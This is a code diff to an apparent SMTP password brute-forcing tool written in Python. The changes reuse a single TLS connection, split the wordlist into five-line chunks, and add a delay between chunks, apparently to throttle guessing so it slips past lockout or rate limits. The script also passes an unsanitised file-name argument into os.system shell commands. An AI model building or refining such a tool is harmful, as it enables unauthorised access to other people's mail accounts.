@@ -48,6 +48,12 @@ def begin ():
 def bruteforce():
 	
 	try:
+					
+		# Setup smtp object
+		smtp = smtplib.SMTP(args.s, args.p)
+		smtp.starttls()
+
+
 		# Check if the wordlist exists
 		if (os.path.isfile(args.w) == False):
 			print(Fore.RED + "[!] Wordlist does not exist")
@@ -67,7 +73,7 @@ def bruteforce():
 		    os.system("mkdir wordlists")
 
 		os.system("cp " + args.w + " wordlists/")
-		os.system("cd wordlists/ && split -l 10 " + args.w)
+		os.system("cd wordlists/ && split -l 5 " + args.w)
 		os.system("cd wordlists/ && rm " + args.w)
 
 		# Check to see if the wordlist exists.
@@ -75,13 +81,12 @@ def bruteforce():
 			
 			for filename in os.listdir("wordlists"):
 
+				print(Fore.YELLOW + "[+] Loading wordlist " + filename)
+				time.sleep(args.t)
+
 				# iterate through each line.
 				for line in fileinput.input("wordlists/" + filename):
 					password = format(line.strip())
-					
-					# Setup smtp object
-					smtp = smtplib.SMTP(args.s, args.p)
-					smtp.starttls()
 
 					# Print the attempts
 					print(Fore.WHITE + "----------------------------------------------------------") 
